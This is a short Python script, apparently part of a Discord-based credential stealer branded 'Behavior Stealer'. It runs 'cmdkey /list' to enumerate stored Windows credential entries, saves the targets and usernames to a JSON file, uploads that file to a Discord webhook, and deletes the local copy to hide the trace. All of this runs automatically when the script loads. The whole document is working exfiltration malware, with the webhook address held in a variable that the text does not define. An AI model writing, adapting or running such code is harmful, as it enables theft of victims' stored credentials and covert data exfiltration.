import os
import json
import subprocess
import requests


def get_stored_credentials():
    try:
        output = subprocess.check_output("cmdkey /list", shell=True, text=True, encoding="utf-8", errors="ignore")
        lines = output.splitlines()
        credentials = []
        current_cred = {}

        for line in lines:
            line = line.strip()
            if not line:
                continue
            if line.startswith("Cible") or line.startswith("Target"):
                if current_cred:
                    credentials.append(current_cred)
                    current_cred = {}
                current_cred["target"] = line.split("=", 1)[-1].strip()
            elif line.startswith("Type"):
                current_cred["type"] = line.split("=", 1)[-1].strip()
            elif line.startswith("Utilisateur") or line.startswith("User"):
                current_cred["user"] = line.split("=", 1)[-1].strip()

        if current_cred:
            credentials.append(current_cred)

        return credentials
    except Exception as e:
        return [{"error": str(e)}]

def send_credentials_to_webhook():
    creds = get_stored_credentials()
    with open("credentials.json", "w", encoding="utf-8") as f:
        json.dump(creds, f, indent=4, ensure_ascii=False)

    with open("credentials.json", "rb") as f:
        files = {"file": ("credentials.json", f)}
        data = {
            "content": "🧾 **Stored Windows Credentials Dump**",
            "username": "Behavior Stealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1375534863049822279/1383070822603817100/logo.png"
        }
        response = requests.post(Behavior, files=files, data=data)
        print(f"[INFO] Webhook status: {response.status_code} {response.text}")

    os.remove("credentials.json")

send_credentials_to_webhook()
